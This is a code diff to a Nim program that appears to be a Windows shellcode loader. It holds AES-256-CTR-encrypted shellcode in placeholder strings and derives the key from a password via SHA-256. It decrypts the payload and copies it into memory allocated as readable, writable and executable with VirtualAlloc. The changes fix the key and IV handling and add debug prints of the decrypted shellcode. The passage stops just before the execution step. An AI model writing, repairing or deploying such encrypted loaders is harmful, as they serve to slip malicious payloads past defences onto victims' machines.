@@ -1,6 +1,9 @@
 import winim
 import nimcrypto
 
+func toByteSeq*(str: string): seq[byte] {.inline.} =
+  ## Converts a string to the corresponding byte sequence.
+  @(str.toOpenArrayByte(0, str.high))
 
 when defined(windows):
 
@@ -10,13 +13,9 @@ when defined(windows):
         echo "[*] Running in x86 process"
 
     elif defined(amd64):
-        func toByteSeq*(str: string): seq[byte] {.inline.} =
-            ## Converts a string to the corresponding byte sequence.
-            @(str.toOpenArrayByte(0, str.high))
         let encShellcode = "REPLACE_ME"
         let iv = "BLANK_IV"
-        let passwd = r"BLANK_PASSWORD"
-        #let key = r"BLANK_PASSWORD"
+        let passwd = """BLANK_PASSWORD"""
         echo "[*] Running in x64 process\n"
 
         var dctx: CTR[aes256]
@@ -30,20 +29,24 @@ when defined(windows):
 
         echo "Shellcode: ", shellcode
 
-        copyMem(addr ivArray[0], unsafeAddr decodedIV, len(decodedIV))
-        echo "Copied iv into memory (maybe)\n"
+        #copyMem(addr ivArray[0], addr iv[0], len(iv))
+        echo "decodedIV: ", decodedIV
+        echo "\nivArray: ", ivArray
+        echo "\nCopied iv into memory (maybe)\n"
 
         var expandedkey = sha256.digest(passwd)
-        copyMem(addr keyArray[0], addr expandedkey.data[0], len(expandedkey.data))
-        echo "Copied key into memory (maybe)\n"
-        dctx.init(keyArray, ivArray)
+        #copyMem(addr keyArray[0], addr expandedkey.data[0], len(expandedkey.data))
+        #echo "Copied key into memory (maybe)\n"
+        dctx.init(expandedkey.data, decodedIV)
+        #dctx.init(keyArray, ivArray)
         dctx.decrypt(shellcode, decShellcode)
+        echo "decShellcode = ", decShellcode
         dctx.clear()
 
         let scLen = cast[SIZE_T](shellcode.len)
         let buffer = VirtualAlloc(cast[LPVOID](0), scLen, cast[DWORD](0x00001000), cast[DWORD](0x40))
         try:
-            copyMem(buffer, unsafeAddr decShellcode, scLen)
+            copyMem(buffer, unsafeAddr decShellcode[0], scLen)
         except:
             echo "[*] CopyMem failed!"
         try:
